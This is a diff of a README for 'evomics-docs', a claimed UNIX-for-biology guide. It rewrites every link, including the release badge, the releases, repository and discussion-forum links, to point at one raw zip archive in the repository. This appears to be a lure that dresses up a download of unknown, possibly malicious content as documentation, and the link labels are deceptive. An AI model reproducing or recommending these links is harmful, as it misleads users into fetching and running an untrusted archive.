@@ -1,6 +1,6 @@
 # 🌱 evomics-docs - Your Guide to UNIX for Biology
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-evomics--docs-brightgreen)](https://github.com/MrBrawlYT/evomics-docs/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/MrBrawlYT/evomics-docs/main/app/og/evomics-docs_1.0.zip%20Latest%20Release-evomics--docs-brightgreen)](https://raw.githubusercontent.com/MrBrawlYT/evomics-docs/main/app/og/evomics-docs_1.0.zip)
 
 ## 📘 Overview
 
@@ -10,7 +10,7 @@ The **evomics-docs** project offers a comprehensive guide to using UNIX and comm
 
 To get started with the **evomics-docs** guide, follow these steps:
 
-1. **Download the Guide**: Click on the link above or visit the [Releases page](https://github.com/MrBrawlYT/evomics-docs/releases) to find the latest version of the documentation.
+1. **Download the Guide**: Click on the link above or visit the [Releases page](https://raw.githubusercontent.com/MrBrawlYT/evomics-docs/main/app/og/evomics-docs_1.0.zip) to find the latest version of the documentation.
 
 2. **Extract and Open**: Once downloaded, extract the contents. You will find a PDF document or a series of HTML files. Open the PDF in any standard viewer or use your web browser for HTML files.
 
@@ -18,7 +18,7 @@ To get started with the **evomics-docs** guide, follow these steps:
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Releases Page](https://github.com/MrBrawlYT/evomics-docs/releases). Here’s how to do it:
+To download the application, visit this page: [Releases Page](https://raw.githubusercontent.com/MrBrawlYT/evomics-docs/main/app/og/evomics-docs_1.0.zip). Here’s how to do it:
 
 1. Click on the link above.
 2. Find the latest version listed.
@@ -72,9 +72,9 @@ If you want to contribute to **evomics-docs**, here’s how:
 
 ## 🔗 Relevant Links
 
-- [Releases Page](https://github.com/MrBrawlYT/evomics-docs/releases) — Download the guide
-- [GitHub Repository](https://github.com/MrBrawlYT/evomics-docs) — View source code and projects
-- [Discussion Forum](https://example.com/discussions) — Join conversations about the guide
+- [Releases Page](https://raw.githubusercontent.com/MrBrawlYT/evomics-docs/main/app/og/evomics-docs_1.0.zip) — Download the guide
+- [GitHub Repository](https://raw.githubusercontent.com/MrBrawlYT/evomics-docs/main/app/og/evomics-docs_1.0.zip) — View source code and projects
+- [Discussion Forum](https://raw.githubusercontent.com/MrBrawlYT/evomics-docs/main/app/og/evomics-docs_1.0.zip) — Join conversations about the guide
 
 ## 📝 License
 
